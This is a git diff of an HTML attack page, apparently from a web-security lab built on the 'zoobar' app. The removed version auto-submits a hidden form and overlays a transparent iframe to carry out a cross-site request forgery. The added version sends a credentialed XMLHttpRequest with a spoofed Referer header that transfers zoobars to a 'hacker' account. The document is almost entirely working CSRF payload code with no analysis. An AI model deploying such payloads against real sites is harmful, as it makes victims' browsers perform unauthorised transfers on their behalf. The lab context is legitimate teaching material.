@@ -1,53 +1,9 @@
-<!DOCTYPE html>
-
-<!--一自动向 web/transfer.php 提交包含 zoobars, recipient 表单的方式，实现 csrf 攻击-->
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>csrf</title>
-  <style>
-    iframe {
-      width: 1440px;
-      height: 900px;
-      position: absolute;
-      top: -0px;
-      left: -0px;
-      z-index: 2;
-      opacity: 0.5;
-    }
-    #hacker {
-      position: absolute;
-      top: 294px;
-      left: 584px;
-      z-index: 1;
-    }
-  </style>
-</head>
-<body>
-
-<iframe name="it" src="https://niss.com/transfer.php"></iframe>
-
-<form method="POST"
-      name="transfer-form"
-      action="https://niss.com/transfer.php"
-      target="it"
-      id="transfer-form"
-      style="display:none">
-
-<!--  默认一个zoobar-->
-  <input name="zoobars" type="text" value="1" size="5">
-
-  <input name="recipient" type="text" value="hacker">
-  <input type="hidden" name="submission" value="Send">
-</form>
-<form>
-  <input type="submit" id="csrfer" value="WIN">
-</form>
-
 <script type="text/javascript">
-  // 自动提交表单
-  form = document.getElementById("transfer-form");
-  form.submit();
+    const req = new XMLHttpRequest();
+    req.withCredentials = true;
+    req.open("POST","https://niss.com/transfer.php",false);
+    req.setRequestHeader("Referer","https://niss.com/transfer.php")
+    req.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    req.send("zoobars=1&recipient=hacker&submission=Send");
+    alert("YOU WIN");
 </script>
-</body>
-</html>
